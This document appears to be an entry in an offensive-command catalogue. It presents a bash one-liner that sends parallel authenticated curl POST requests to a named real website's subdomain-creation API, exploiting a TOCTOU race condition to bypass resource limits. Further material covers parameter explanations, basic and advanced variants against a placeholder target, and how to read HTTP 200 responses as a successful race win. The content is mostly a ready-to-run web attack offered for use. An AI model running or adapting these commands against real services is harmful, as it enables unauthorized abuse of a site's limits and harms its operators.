---
data: >-
  seq 1 10 | xargs -n1 -P10 -I{} curl -b cookies.txt -X POST -d
  "subdomain=whitelabel{}.chaturbate.com&other_params=values"
  https://chaturbate.com/api/add_whitelabel_subdomain
tags:
  - web-exploit
  - race-condition
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:18.840Z'
id: 85b09634-38ec-463e-b367-9d3e14a5d6ea
verified: false
validated: true
submitted: true
---
# curl-concurrent-requests

## Command

```bash
seq 1 10 | xargs -n1 -P10 -I{} curl -b cookies.txt -X POST -d "subdomain=whitelabel{}.chaturbate.com&other_params=values" https://chaturbate.com/api/add_whitelabel_subdomain
```

## Description

This command generates 10 unique subdomain names and sends them as concurrent POST requests using curl and xargs to exploit a TOCTOU race condition, bypassing limits on resource creation in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-P10` | Number of parallel processes (adjust for concurrency) | Yes |
| `-b cookies.txt` | Path to authentication cookies file | Yes |
| `-d` | POST data with subdomain parameter | Yes |
| `{}` | Placeholder for sequence number in subdomain name | Yes |

## Examples

### Basic Usage

```bash
seq 1 5 | xargs -n1 -P5 -I{} curl -b cookies.txt -X POST -d "subdomain=test{}.example.com" https://target.com/api/add
```

### Advanced Usage

```bash
seq 1 20 | xargs -n1 -P20 -I{} curl -b cookies.txt -X POST -d "subdomain=unique{}.domain.com&confirm=true" -H "Content-Type: application/x-www-form-urlencoded" https://target.com/api/add -w "%{http_code}\n"
```

## Expected Output

Multiple lines of HTTP responses, e.g., "200" for each successful creation, indicating bypassed limits. Failures may show 429 or limit errors, but successes confirm the race win.

## Related

- [[Related Procedure|procedures/Exploit-TOCTOU-Race-Condition-to-Bypass-Subdomain-Limit]]
